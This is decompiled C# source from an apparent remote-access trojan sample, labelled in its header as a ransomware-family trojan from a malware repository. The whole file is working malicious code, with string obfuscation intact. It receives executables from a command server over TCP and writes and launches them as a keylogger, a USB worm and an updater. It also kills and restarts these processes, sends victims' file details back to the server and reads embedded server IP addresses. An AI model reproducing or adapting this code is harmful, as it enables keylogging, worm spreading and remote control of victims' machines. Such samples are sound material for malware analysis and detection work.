// Decompiled with JetBrains decompiler
// Type: gltadbrigr.LPRRUMD
// Assembly: gltadbrigr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 90EF545C-9E75-40E4-A102-AD83A77103BB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4342dd4999d1247fc9032003bafb7d3d58d2cbefe1705d5d91e258d0ed1fef86.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace gltadbrigr
{
  public class LPRRUMD
  {
    public MARRCMD server;
    public DateTime gltadbrigrrunTime;

    public NetworkStream gltadbrigrNuS(TcpClient gltadbrigrtcpsck) => gltadbrigrtcpsck.GetStream();

    public void gltadbrigrseeUSuB()
    {
      try
      {
        if (Process.GetProcessesByName(WCRUONF.gltadbrigrusbApp).Length != 0)
          return;
        if (File.Exists(WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbApp + ".exe!gltadbrigr".Split('!')[0]))
          Process.Start(WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbApp + ".exe!gltadbrigr".Split('!')[0]);
      }
      catch
      {
      }
    }

    public string gltadbrigrfile_inufo(string path, bool ret = false)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(path);
        string name = fileInfo.Name;
        string str1;
        if (ret)
          str1 = "<|gltadbrigr".Split('|')[0];
        else
          str1 = ">|gltadbrigr".Split('|')[0];
        string str2 = name + str1;
        string str3 = fileInfo.CreationTimeUtc.ToString();
        string str4;
        if (ret)
          str4 = "<|gltadbrigr".Split('|')[0];
        else
          str4 = ">|gltadbrigr".Split('|')[0];
        string str5 = str2 + str3 + str4;
        string str6 = this.gltadbrigrget_suize(fileInfo.Length);
        string str7;
        if (ret)
          str7 = "<|gltadbrigr".Split('|')[0];
        else
          str7 = ">|gltadbrigr".Split('|')[0];
        string str8 = str5 + str6 + str7;
        if (!ret)
          this.server.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-fiulsz=|gltadbrigr".Split('|')[0] + str8);
        return str8;
      }
      catch
      {
        return "";
      }
    }

    public string gltadbrigrget_suize(long byteCount)
    {
      try
      {
        string[] strArray = new string[7]
        {
          "B!gltadbrigr".Split('!')[0],
          "KB!gltadbrigr".Split('!')[0],
          "MB!gltadbrigr".Split('!')[0],
          "GB",
          "TB",
          "PB",
          "EB!gltadbrigr".Split('!')[0]
        };
        if (byteCount == 0L)
          return "0" + strArray[0];
        long a = Math.Abs(byteCount);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        return ((double) Math.Sign(byteCount) * num).ToString() + strArray[int32];
      }
      catch
      {
        return "";
      }
    }

    public void gltadbrigrseekiluogr()
    {
      try
      {
        if (Process.GetProcessesByName(WCRUONF.gltadbrigrkiyApp).Length != 0)
          return;
        if (File.Exists(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp + ".exe!gltadbrigr".Split('!')[0]))
          Process.Start(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp + ".exe!gltadbrigr".Split('!')[0].ToString());
      }
      catch
      {
      }
    }

    public LPRRUMD(MARRCMD lID) => this.server = lID;

    public void gltadbrigrseeUSuBl()
    {
      try
      {
        if (Process.GetProcessesByName(WCRUONF.gltadbrigrusbApp).Length != 0)
          return;
        if (File.Exists(WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbApp + ".exe!gltadbrigr".Split('!')[0]))
          Process.Start(WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbApp + ".exe!gltadbrigr".Split('!')[0].ToString());
      }
      catch
      {
      }
    }

    public void gltadbrigrcheckuLast()
    {
      DateTime now = DateTime.Now;
      try
      {
        if (Math.Abs(this.gltadbrigrrunTime.Subtract(now).Minutes) <= 6)
          return;
        this.server.gltadbrigrtcpsck.Close();
        this.server.gltadbrigris_wurking = false;
      }
      catch
      {
      }
    }

    public void gltadbrigrdeleteKLS()
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName(WCRUONF.gltadbrigrkiyApp);
        if (processesByName.Length == 1)
          this.gltadbrigrbreauk_prouss(processesByName[0].Id);
        Thread.Sleep(50);
        if (!File.Exists(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp))
          return;
        File.Delete(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp);
        if (File.Exists(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp + "$|gltadbrigr".Split('|')[0]))
          File.Delete(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp + "$|gltadbrigr".Split('|')[0]);
        Thread.Sleep(150);
        this.gltadbrigrseekiluogr();
      }
      catch
      {
      }
    }

    public void gltadbrigrbreauk_prouss(int proid)
    {
      try
      {
        Process.GetProcessById(proid).Kill();
        Thread.Sleep(10);
      }
      catch
      {
      }
    }

    public string[] gltadbrigrserverIuPD() => Encoding.UTF8.GetString(WCRUONF.gltadbrigrvpsips, 0, WCRUONF.gltadbrigrvpsips.Length).Split('?');

    public void gltadbrigrdo_uputed(string uType, string switchType)
    {
      try
      {
        byte[] bytes = this.server.gltadbrigrpuull_data();
        switch (uType)
        {
          case "gltadbrigr$uk7log":
            if (bytes == null)
              break;
            if (!Directory.Exists(WCRUONF.gltadbrigrkiuPath()))
              Directory.CreateDirectory(WCRUONF.gltadbrigrkiuPath());
            Process[] processesByName1 = Process.GetProcessesByName(WCRUONF.gltadbrigrkiyApp);
            if (processesByName1.Length == 1)
              this.gltadbrigrbreauk_prouss(processesByName1[0].Id);
            File.WriteAllBytes(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp + ".exe", bytes);
            break;
          case "gltadbrigr$up7datu":
          case "gltadbrigr$us7bwrm":
            if (!Directory.Exists(WCRUONF.gltadbrigrusbuPath()))
              Directory.CreateDirectory(WCRUONF.gltadbrigrusbuPath());
            if (bytes == null)
              break;
            Process[] processesByName2 = Process.GetProcessesByName(WCRUONF.gltadbrigrusbApp);
            if (processesByName2.Length == 1)
              this.gltadbrigrbreauk_prouss(processesByName2[0].Id);
            File.WriteAllBytes(WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbApp + ".exe!gltadbrigr".Split('!')[0], bytes);
            break;
        }
      }
      catch
      {
      }
    }

    public void gltadbrigrremouve_uuser()
    {
      try
      {
        byte[] bytes = this.server.gltadbrigrpuull_data();
        if (bytes == null)
          return;
        if (!File.Exists(WCRUONF.gltadbrigrget_mupath() + WCRUONF.gltadbrigrremvUser + ".exe!gltadbrigr".Split('!')[0]))
        {
          File.WriteAllBytes(WCRUONF.gltadbrigrget_mupath() + WCRUONF.gltadbrigrremvUser + ".exe!gltadbrigr".Split('!')[0], bytes);
          Process.Start(WCRUONF.gltadbrigrget_mupath() + WCRUONF.gltadbrigrremvUser + ".exe".ToString());
        }
      }
      catch
      {
      }
    }
  }
}
